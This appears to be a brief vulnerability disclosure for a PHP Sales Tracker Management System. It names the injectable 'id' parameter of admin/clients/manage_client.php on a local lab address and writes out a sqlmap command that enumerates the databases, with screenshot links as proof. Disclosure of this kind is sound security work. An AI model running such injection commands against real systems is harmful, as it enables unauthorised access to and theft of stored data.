Download sourcecode from https://www.sourcecodester.com/php/16061/sales-tracker-management-system-using-php-free-source-code.html

Deploy the system

The sql injection url: http://192.168.131.135/php-sts/admin/clients/manage_client.php?id=1 Vulnerability trigger parameter: id

sourcecode:

![sts2-1](https://user-images.githubusercontent.com/127364570/223908076-eda4cdea-d044-4672-9390-f8629980ac41.JPG)

sqlmap : sqlmap.py -u "http://192.168.131.135/php-sts/admin/clients/manage_client.php?id=1" -p id  --risk 3 --dbs

![sts2-2](https://user-images.githubusercontent.com/127364570/223908175-2663bb22-5a78-4673-8438-e30fa17afded.JPG)
![sts2-3](https://user-images.githubusercontent.com/127364570/223908206-302d6d4d-a932-4145-bb31-aa088a6455db.JPG)

